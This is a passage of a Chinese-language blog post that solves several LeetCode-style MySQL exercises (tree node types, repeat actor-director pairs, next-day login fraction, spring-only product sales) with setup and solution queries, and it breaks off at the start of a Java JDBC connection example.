<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">	id,</span><br><span class="line">	<span class="string">&#x27;root&#x27;</span> <span class="keyword">AS</span> TYPE</span><br><span class="line"><span class="keyword">FROM</span> tree</span><br><span class="line"><span class="keyword">WHERE</span> p_id <span class="keyword">IS</span> <span class="keyword">NULL</span></span><br></pre></td></tr></table></div></figure></li>
<li><p>内部节点</p>
<p>父节点和子节点都不是<code>NULL</code>，其中子节点不是<code>NULL</code>可以通过判断其他节点的父节点是不是该节点来确定。</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id,<span class="string">&#x27;Inner&#x27;</span> <span class="keyword">AS</span> TYPE</span><br><span class="line"><span class="keyword">FROM</span> tree</span><br><span class="line"><span class="keyword">WHERE</span> id <span class="keyword">IN</span></span><br><span class="line">	(<span class="keyword">SELECT</span> p_id</span><br><span class="line">	<span class="keyword">FROM</span> tree</span><br><span class="line">	<span class="keyword">WHERE</span> p_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>)</span><br><span class="line">	<span class="keyword">AND</span> p_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br></pre></td></tr></table></div></figure></li>
<li><p>叶子节点</p>
<p>和内部节点类似，子节点为<code>NULL</code>，存在父节点</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id,<span class="string">&#x27;Leaf&#x27;</span> <span class="keyword">AS</span> TYPE</span><br><span class="line"><span class="keyword">FROM</span> tree</span><br><span class="line"><span class="keyword">WHERE</span> id <span class="keyword">NOT</span> <span class="keyword">IN</span></span><br><span class="line">	(<span class="keyword">SELECT</span> p_id</span><br><span class="line">	<span class="keyword">FROM</span> tree</span><br><span class="line">	<span class="keyword">WHERE</span> p_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>)</span><br><span class="line">	<span class="keyword">AND</span> p_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br></pre></td></tr></table></div></figure></li>
</ul>
<p>然后将三个表联合起来，排个序即可</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">	id,</span><br><span class="line">	<span class="string">&#x27;Root&#x27;</span> <span class="keyword">AS</span> TYPE</span><br><span class="line"><span class="keyword">FROM</span> tree</span><br><span class="line"><span class="keyword">WHERE</span> p_id <span class="keyword">IS</span> <span class="keyword">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> id,<span class="string">&#x27;Inner&#x27;</span> <span class="keyword">AS</span> TYPE</span><br><span class="line"><span class="keyword">FROM</span> tree</span><br><span class="line"><span class="keyword">WHERE</span> id <span class="keyword">IN</span></span><br><span class="line">	(<span class="keyword">SELECT</span> p_id</span><br><span class="line">	<span class="keyword">FROM</span> tree</span><br><span class="line">	<span class="keyword">WHERE</span> p_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>)</span><br><span class="line">	<span class="keyword">AND</span> p_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> id,<span class="string">&#x27;Leaf&#x27;</span> <span class="keyword">AS</span> TYPE</span><br><span class="line"><span class="keyword">FROM</span> tree</span><br><span class="line"><span class="keyword">WHERE</span> id <span class="keyword">NOT</span> <span class="keyword">IN</span></span><br><span class="line">	(<span class="keyword">SELECT</span> p_id</span><br><span class="line">	<span class="keyword">FROM</span> tree</span><br><span class="line">	<span class="keyword">WHERE</span> p_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>)</span><br><span class="line">	<span class="keyword">AND</span> p_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> id;</span><br></pre></td></tr></table></div></figure>

<p><code>CASE语句</code>查询：</p>
<p>形式为<code>case-when-then-else-end</code></p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">	id,</span><br><span class="line">	<span class="keyword">CASE</span></span><br><span class="line">	    <span class="keyword">WHEN</span> p_id <span class="keyword">IS</span> <span class="keyword">NULL</span> <span class="keyword">THEN</span> <span class="string">&#x27;Root&#x27;</span>           #root</span><br><span class="line">	    <span class="keyword">WHEN</span> id <span class="keyword">IN</span>(<span class="keyword">SELECT</span> p_id</span><br><span class="line">			<span class="keyword">FROM</span> tree</span><br><span class="line">			<span class="keyword">WHERE</span> p_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>)</span><br><span class="line">		    <span class="keyword">THEN</span> <span class="string">&#x27;Inner&#x27;</span>                        #<span class="keyword">inner</span></span><br><span class="line">	    <span class="keyword">ELSE</span> <span class="string">&#x27;Leaf&#x27;</span>                             #leaf</span><br><span class="line">    <span class="keyword">END</span> <span class="keyword">AS</span> TYPE</span><br><span class="line"><span class="keyword">FROM</span> tree</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> id;</span><br></pre></td></tr></table></div></figure>


        <h2 id="合作过至少三次的演员和导演"   >
          <a href="#合作过至少三次的演员和导演" class="heading-link"><i class="fas fa-link"></i></a><a href="#合作过至少三次的演员和导演" class="headerlink" title="合作过至少三次的演员和导演"></a>合作过至少三次的演员和导演</h2>
      <figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> If <span class="keyword">Not</span> <span class="keyword">Exists</span> ActorDirector (actor_id <span class="type">int</span>, director_id <span class="type">int</span>, <span class="type">timestamp</span> <span class="type">int</span>);</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> ActorDirector;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> ActorDirector (actor_id, director_id, <span class="type">timestamp</span>) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> ActorDirector (actor_id, director_id, <span class="type">timestamp</span>) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> ActorDirector (actor_id, director_id, <span class="type">timestamp</span>) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> ActorDirector (actor_id, director_id, <span class="type">timestamp</span>) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> ActorDirector (actor_id, director_id, <span class="type">timestamp</span>) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;4&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> ActorDirector (actor_id, director_id, <span class="type">timestamp</span>) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> ActorDirector (actor_id, director_id, <span class="type">timestamp</span>) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;6&#x27;</span>);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221103211036661.png" alt="image-20221103211036661"></p>
<p>主要是<code>having</code>的知识点</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/caibaotimes/p/13722165.html" >mysql having和where的区别 - caibaotimes - 博客园 (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><strong>where：</strong></p>
<ul>
<li>是作用在查询结果进行分组之前，过滤掉不符合条件的数据。</li>
<li>where中不能包含聚合函数。（注意是：where后面子句不能有聚合函数，而在含有where中可以使用聚合函数）</li>
<li>作用在group by和having字句前</li>
<li>是作用于对表与视图</li>
</ul>
<p><strong>having：</strong></p>
<ul>
<li>是作用在查询结果分组之后，筛选满足条件的组，过滤掉数据。</li>
<li>通常跟聚合函数一起使用。</li>
<li>having子句在聚合后对组记录进行筛选。</li>
<li>是作用于分组</li>
</ul>
<p>其实就是<code>group by</code>的时候用到<code>having</code>来进行分组后的条件筛选，而不能用<code>where</code>，<code>where</code>是分组之前使用</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> actor_id,director_id</span><br><span class="line"><span class="keyword">FROM</span> ActorDirector</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> ActorDirector.actor_id,ActorDirector.director_id</span><br><span class="line"><span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(ActorDirector.director_id)<span class="operator">&gt;=</span> <span class="number">3</span></span><br></pre></td></tr></table></div></figure>

<p>或者先计数然制表，然后再查询也行</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> actor_id,director_id </span><br><span class="line"><span class="keyword">FROM</span>(</span><br><span class="line">	<span class="keyword">SELECT</span> actor_id,director_id,<span class="built_in">COUNT</span>(director_id) <span class="keyword">AS</span> cnt</span><br><span class="line">	<span class="keyword">FROM</span> ActorDirector</span><br><span class="line">	<span class="keyword">GROUP</span> <span class="keyword">BY</span> ActorDirector.actor_id,ActorDirector.director_id</span><br><span class="line">) cntTable</span><br><span class="line"><span class="keyword">WHERE</span> cntTable.cnt <span class="operator">&gt;=</span> <span class="number">3</span> </span><br></pre></td></tr></table></div></figure>




        <h2 id="游戏玩法分析-IV"   >
          <a href="#游戏玩法分析-IV" class="heading-link"><i class="fas fa-link"></i></a><a href="#游戏玩法分析-IV" class="headerlink" title="游戏玩法分析 IV"></a>游戏玩法分析 IV</h2>
      <p>创建语句</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> If <span class="keyword">Not</span> <span class="keyword">Exists</span> Activity (player_id <span class="type">int</span>, device_id <span class="type">int</span>, event_date <span class="type">date</span>, games_played <span class="type">int</span>);</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Activity;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (player_id, device_id, event_date, games_played) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2016-03-01&#x27;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (player_id, device_id, event_date, games_played) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2016-03-02&#x27;</span>, <span class="string">&#x27;6&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (player_id, device_id, event_date, games_played) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2017-06-25&#x27;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (player_id, device_id, event_date, games_played) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2016-03-02&#x27;</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (player_id, device_id, event_date, games_played) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;2018-07-03&#x27;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221104105326813.png" alt="image-20221104105326813"></p>

        <h3 id="知识点：-5"   >
          <a href="#知识点：-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#知识点：-5" class="headerlink" title="知识点："></a>知识点：</h3>
      
        <h4 id="Date数据类型及函数："   >
          <a href="#Date数据类型及函数：" class="heading-link"><i class="fas fa-link"></i></a><a href="#Date数据类型及函数：" class="headerlink" title="Date数据类型及函数："></a><code>Date</code>数据类型及函数：</h4>
      <p><code>mysql</code>支持<code>date</code>日期数据类型以及为其创建了一个<code>DATE</code>函数，用法如下</p>
<ul>
<li><p>正常情况查询</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221104105904188.png" alt="image-20221104105904188"></p>
</li>
<li><p>进行日期加减查询</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221104105921938.png" alt="image-20221104105921938"></p>
</li>
<li><p>加入<code>DATE</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221104105954814.png" alt="image-20221104105954814"></p>
</li>
</ul>

        <h4 id="保留小数CONVERT："   >
          <a href="#保留小数CONVERT：" class="heading-link"><i class="fas fa-link"></i></a><a href="#保留小数CONVERT：" class="headerlink" title="保留小数CONVERT："></a>保留小数CONVERT：</h4>
      <p>可以使用<code>CONVERT</code>或者<code>TRUNCATE</code>来对除法进行保留小数</p>
<ul>
<li><p><code>CONVERT(a/b,DECIMAL(10,2))</code></p>
<p>代表<code>a/b</code>以10精度计算，保留2位小数，这个精度也算是小数点后几位，存在四舍五入</p>
</li>
<li><p><code>TRUNCATE(a/b,2)</code></p>
<p>代表<code>a/b</code>保留2位小数，但是没有四舍五入</p>
</li>
</ul>

        <h3 id="解析："   >
          <a href="#解析：" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析：" class="headerlink" title="解析："></a>解析：</h3>
      <ul>
<li><p>首先确定所有人首次登录的第二天</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> player_id, <span class="type">DATE</span>(<span class="built_in">MIN</span>(event_date) <span class="operator">+</span> <span class="number">1</span>) event_date</span><br><span class="line">	<span class="keyword">FROM</span> activity</span><br><span class="line">	<span class="keyword">GROUP</span> <span class="keyword">BY</span> player_id</span><br></pre></td></tr></table></div></figure></li>
<li><p>然后判断第二天是否在<code>activity</code>表格中，并且计数，这个即代表在首次登录的第二天的所有人总和。</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> cnt</span><br><span class="line"><span class="keyword">FROM</span> activity </span><br><span class="line"><span class="keyword">WHERE</span> (player_id, event_date) <span class="keyword">IN</span></span><br><span class="line">	(<span class="keyword">SELECT</span> player_id, <span class="type">DATE</span>(<span class="built_in">MIN</span>(event_date) <span class="operator">+</span> <span class="number">1</span>) event_date</span><br><span class="line">	<span class="keyword">FROM</span> activity</span><br><span class="line">	<span class="keyword">GROUP</span> <span class="keyword">BY</span> player_id)</span><br></pre></td></tr></table></div></figure></li>
<li><p>之后再将所有人计算总和，然后计算除法即可</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CONVERT</span>(top.cnt<span class="operator">/</span>down.cnt,<span class="type">DECIMAL</span>(<span class="number">10</span>,<span class="number">2</span>)) fraction </span><br><span class="line"><span class="keyword">FROM</span> </span><br><span class="line">(<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> cnt</span><br><span class="line"><span class="keyword">FROM</span> activity </span><br><span class="line"><span class="keyword">WHERE</span> (player_id, event_date) <span class="keyword">IN</span></span><br><span class="line">	(<span class="keyword">SELECT</span> player_id, <span class="type">DATE</span>(<span class="built_in">MIN</span>(event_date) <span class="operator">+</span> <span class="number">1</span>) event_date</span><br><span class="line">	<span class="keyword">FROM</span> activity</span><br><span class="line">	<span class="keyword">GROUP</span> <span class="keyword">BY</span> player_id)) top,</span><br><span class="line"></span><br><span class="line">(<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> cnt</span><br><span class="line"><span class="keyword">FROM</span> (<span class="keyword">SELECT</span> player_id</span><br><span class="line">	<span class="keyword">FROM</span> activity</span><br><span class="line">	<span class="keyword">GROUP</span> <span class="keyword">BY</span> player_id) player_cnt) down</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h2 id="销售分析III"   >
          <a href="#销售分析III" class="heading-link"><i class="fas fa-link"></i></a><a href="#销售分析III" class="headerlink" title="销售分析III"></a>销售分析III</h2>
      <p>创建语句：</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> If <span class="keyword">Not</span> <span class="keyword">Exists</span> Product (product_id <span class="type">int</span>, product_name <span class="type">varchar</span>(<span class="number">10</span>), unit_price <span class="type">int</span>);</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> If <span class="keyword">Not</span> <span class="keyword">Exists</span> Sales (seller_id <span class="type">int</span>, product_id <span class="type">int</span>, buyer_id <span class="type">int</span>, sale_date <span class="type">date</span>, quantity <span class="type">int</span>, price <span class="type">int</span>);</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Product;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Product (product_id, product_name, unit_price) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;S8&#x27;</span>, <span class="string">&#x27;1000&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Product (product_id, product_name, unit_price) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;G4&#x27;</span>, <span class="string">&#x27;800&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Product (product_id, product_name, unit_price) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;iPhone&#x27;</span>, <span class="string">&#x27;1400&#x27;</span>);</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Sales;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Sales (seller_id, product_id, buyer_id, sale_date, quantity, price) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2019-01-21&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2000&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Sales (seller_id, product_id, buyer_id, sale_date, quantity, price) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2019-02-17&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;800&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Sales (seller_id, product_id, buyer_id, sale_date, quantity, price) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2019-06-02&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;800&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Sales (seller_id, product_id, buyer_id, sale_date, quantity, price) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;2019-05-13&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2800&#x27;</span>);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221104163658566.png" alt="image-20221104163658566"></p>
<p>依次获得相关子表</p>
<ul>
<li><p>在春季销售的所有产品</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> product_id</span><br><span class="line"><span class="keyword">FROM</span> Sales</span><br><span class="line"><span class="keyword">WHERE</span> sale_date <span class="keyword">BETWEEN</span> <span class="string">&#x27;2019-01-01&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;2019-03-31&#x27;</span></span><br></pre></td></tr></table></div></figure></li>
<li><p>不在春季销售的所有产品</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> product_id</span><br><span class="line"><span class="keyword">FROM</span> Sales</span><br><span class="line"><span class="keyword">WHERE</span> sale_date <span class="keyword">NOT</span> <span class="keyword">BETWEEN</span> <span class="string">&#x27;2019-01-01&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;2019-03-31&#x27;</span></span><br></pre></td></tr></table></div></figure></li>
<li><p>确保在春季销售的产品中没有不在春季销售的所有产品</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> testOne.product_id</span><br><span class="line">	<span class="keyword">FROM</span></span><br><span class="line">	(<span class="keyword">SELECT</span> product_id</span><br><span class="line">		<span class="keyword">FROM</span> Sales</span><br><span class="line">		<span class="keyword">WHERE</span> sale_date <span class="keyword">BETWEEN</span> <span class="string">&#x27;2019-01-01&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;2019-03-31&#x27;</span>) testOne</span><br><span class="line">	<span class="keyword">WHERE</span> testOne.product_id <span class="keyword">NOT</span> <span class="keyword">IN</span> </span><br><span class="line">	(<span class="keyword">SELECT</span> product_id</span><br><span class="line">		<span class="keyword">FROM</span> Sales</span><br><span class="line">		<span class="keyword">WHERE</span> sale_date <span class="keyword">NOT</span> <span class="keyword">BETWEEN</span> <span class="string">&#x27;2019-01-01&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;2019-03-31&#x27;</span>)</span><br></pre></td></tr></table></div></figure></li>
<li><p>然后依据<code>product_id</code>查询在<code>Product</code>表中查询</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> idTable.product_id,product.product_name</span><br><span class="line"><span class="keyword">FROM</span> </span><br><span class="line">(<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> testOne.product_id</span><br><span class="line">	<span class="keyword">FROM</span></span><br><span class="line">	(<span class="keyword">SELECT</span> product_id</span><br><span class="line">		<span class="keyword">FROM</span> Sales</span><br><span class="line">		<span class="keyword">WHERE</span> sale_date <span class="keyword">BETWEEN</span> <span class="string">&#x27;2019-01-01&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;2019-03-31&#x27;</span>) testOne</span><br><span class="line">	<span class="keyword">WHERE</span> testOne.product_id <span class="keyword">NOT</span> <span class="keyword">IN</span> </span><br><span class="line">	(<span class="keyword">SELECT</span> product_id</span><br><span class="line">		<span class="keyword">FROM</span> Sales</span><br><span class="line">		<span class="keyword">WHERE</span> sale_date <span class="keyword">NOT</span> <span class="keyword">BETWEEN</span> <span class="string">&#x27;2019-01-01&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;2019-03-31&#x27;</span>))idTable,</span><br><span class="line">Product</span><br><span class="line"><span class="keyword">WHERE</span> idTable.product_id <span class="operator">=</span> product.`product_id`</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h2 id="JAVA连接"   >
          <a href="#JAVA连接" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA连接" class="headerlink" title="JAVA连接"></a>JAVA连接</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String URL = <span class="string">&quot;jdbc:mysql://localhost:3306&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String USER = <span 